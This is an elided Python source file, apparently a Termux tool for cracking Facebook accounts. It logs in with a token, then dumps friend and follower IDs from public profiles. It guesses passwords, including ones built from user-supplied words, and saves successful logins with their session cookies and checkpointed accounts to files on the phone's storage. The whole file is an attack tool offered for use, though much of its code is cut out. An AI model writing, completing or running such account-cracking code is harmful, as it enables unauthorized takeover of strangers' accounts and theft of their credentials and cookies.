...
'''
	...
	cetak(nel(oi, title='[bold cyan] • CODE BY M4.$!L3N7 • [/bold cyan]'))
# VALIDASI TOKEN
def login():
...
def menu(my_name,my_id):
	...
	print(x+'['+h+'•'+x+'] ADDRESS IP     : '+str(sh['origin']))
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/M4.444/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/M4.444/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/M4.444/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/M4.444/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/M4.444/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/M4.444/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/M4.444/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/M4.444/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/M4.444/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] TYPE "me" TO DUMP FROM YOUR OWN FRIENDSHIP')
...
def dumpdump(pil):
	try:
		...
		li = '# YOUR SIGNAL IS BAD PRAY FIRST'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		input('')
...
def dump_pengikut():
	...
	try:
		...
		teks = '# FAILED DUMP OR TOKEN CORRECT'
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	guw = '# SHOW RELATED APPLICATIONS ? (y/t)'
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	guw = '# SHOW OPTIONS CHEKPOINT ? (y/t)'
	sol().print(mark(guw, style='cyan'))
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: Yanz handsome,Cute, Pogiko'
		cetak(nel(krek, title=' • PASSWORD ADDITION • '))
...
# WORDLIST
def passwrd():
	ler = '# RUNNING CRACK, PRESS CTRL+Z TO STOP'
	sol().print(mark(ler, style='green'))
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/M4.444/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/M4.444/CP/%s\n[•] MODE AIRPLANE 5 SECONDS IF NO RESULT'%(okc,cpc)
...
def crack(idf,pwv,nmf):
	...
	sys.stdout.write('\r%s M4.444 %s/%s [ OK:%s - CP:%s - %s%s%s ] '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					try:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAMA : {nmf}\n[•] TTL : {ttl}'
						open('/sdcard/M4.444/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
					except:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAMA : {nmf}'
						open('/sdcard/M4.444/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					statuscp1 = nel(statuscp, style='yellow')
					cetak(nel(statuscp1, title='M4.444 CP'))
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/M4.444/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='M4.444 LIVE'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]M4.444 LIVE[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='M4.444 OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
...
def cekopsii(id,pw):
		try:
			...
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					...
					if opsinya=='':
						try:
							...
							open('/sdcard/M4.444/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')

						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
							open('/sdcard/M4.444/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/M4.444/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/M4.444/CP/'+cpc,'a').write(id+'|'+pw+'\n')
				...
				statusok1 = nel(statusok, style='yellow')
				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				open('/sdcard/M4.444/OK/'+okc,'a').write(id+'|'+pw+'\n')
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/M4.444/CP')
	except:pass
	try:os.mkdir('/sdcard/M4.444/OK')
	except:pass
	login()
